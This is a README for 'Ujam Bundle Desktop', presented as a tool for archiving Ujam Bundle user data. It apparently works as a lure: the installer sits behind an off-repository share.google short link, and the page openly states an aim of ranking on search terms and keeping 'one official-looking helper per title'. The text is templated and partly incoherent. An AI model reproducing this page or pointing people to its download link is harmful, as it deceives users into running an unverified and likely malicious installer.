![Ujam Bundle Desktop](assets/hero.png)

# Ujam Bundle Desktop

*Archive Ujam Bundle files on this machine before you change the install.*

## What Ujam Bundle Desktop is

This repository is **Ujam Bundle Desktop**, a desktop utility. Archive Ujam Bundle files on this machine before you change the install.

Patches move Ujam Bundle data paths without warning.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Locates Ujam Bundle user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Ujam Bundle is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/haileyrobinson84/ujam-bundle-desktop

MIT license. See `LICENSE`.
